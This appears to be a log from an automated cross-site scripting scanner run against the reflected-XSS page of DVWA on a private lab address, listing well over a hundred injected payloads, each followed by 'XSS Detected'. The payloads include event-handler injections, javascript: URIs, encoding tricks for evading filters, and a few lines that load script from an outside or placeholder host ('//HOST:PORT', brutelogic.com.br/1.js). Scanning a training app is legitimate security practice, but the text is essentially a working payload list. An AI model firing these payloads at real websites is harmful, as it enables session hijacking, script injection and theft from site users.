+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x/onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%09onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%0Aonxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%0Conxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%0Donxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%2Fonxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "<x 1='1'onxxx=1 \n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x 1="1"onxxx=1\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x </onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x 1=">" onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<http://onxxx%3D1/\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "<x onxxx=alert(1) 1='\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'onload=alert(1)><svg/1='\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'>alert(1)</script><script/1=' \n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '*/alert(1)</script><script>/*\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '*/alert(1)">\'onload="/*<svg/1=\'\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '`-alert(1)">\'onload="`<svg/1=\'\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "*/</script>'>alert(1)/*<script/1='\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script>alert(1)</script> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src=javascript:alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<iframe src=javascript:alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<embed src=javascript:alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a href=javascript:alert(1)>click \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<math><brute href=javascript:alert(1)>click \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form action=javascript:alert(1)><input type=submit> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<isindex action=javascript:alert(1) type=submit value=click> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form><button formaction=javascript:alert(1)>click \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form><input formaction=javascript:alert(1) type=submit value=click> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form><input formaction=javascript:alert(1) type=image value=click> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form><input formaction=javascript:alert(1) type=image src=SOURCE> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<isindex formaction=javascript:alert(1) type=submit value=click> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<object data=javascript:alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<svg><script xlink:href=data:,alert(1) /> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<math><brute xlink:href=javascript:alert(1)>click \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<html ontouchstart=alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<html ontouchend=alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<html ontouchmove=alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<html ontouchcancel=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onorientationchange=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><img src=1 onerror=alert(1)>.gif\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src="data:&comma;alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><script src=data:&comma;alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src="//brutelogic.com.br&sol;1.js&num; \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><script src=//brutelogic.com.br&sol;1.js&num; \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<base href=//0>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onload=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onpageshow=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onfocus=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onhashchange=alert(1)><a href=#x>click this!#x\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onscroll=alert(1)><br><br><br><br>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<br><br><br><br><br><br><br><br><br><br>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<br><br><br><br><br><br><br><br><br><br>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<br><br><br><br><br><br><x id=x>#x\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onresize=alert(1)>press F12!\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onhelp=alert(1)>press F1! (MSIE)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<marquee onstart=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<marquee loop=1 width=0 onfinish=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<audio src onloadstart=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<video onloadstart=alert(1)><source>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<input autofocus onblur=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<keygen autofocus onfocus=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form onsubmit=alert(1)><input type=submit>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<select onchange=alert(1)><option>1<option>2\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<menu id=x contextmenu=x onshow=alert(1)>right click me!\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'alert`1`\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'alert&lpar;1&rpar;\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'alert&#x28;1&#x29\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'alert&#40;1&#41\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '(alert)(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'a=alert,a(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '[1].find(alert)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'top["al"+"ert"](1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'top[/al/.source+/ert/.source](1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'al\\u0065rt(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "top['al\\145rt'](1)\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<image/src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<img/src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<image src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<img src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<image src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<img src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '</scrip</script>t><img src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<svg onload=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><svg onload=alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"onmouseover=alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"autofocus/onfocus=alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'-alert(1)-'\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'-alert(1)//\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "\\'-alert(1)//\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '</script><svg onload=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onblur=alert(1)>lose focus! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onclick=alert(1)>click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x oncopy=alert(1)>copy this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x oncontextmenu=alert(1)>right click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x oncut=alert(1)>copy this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x ondblclick=alert(1)>double click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x ondrag=alert(1)>drag this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onfocus=alert(1)>focus this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable oninput=alert(1)>input here! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onkeydown=alert(1)>press any key! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onkeypress=alert(1)>press any key! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
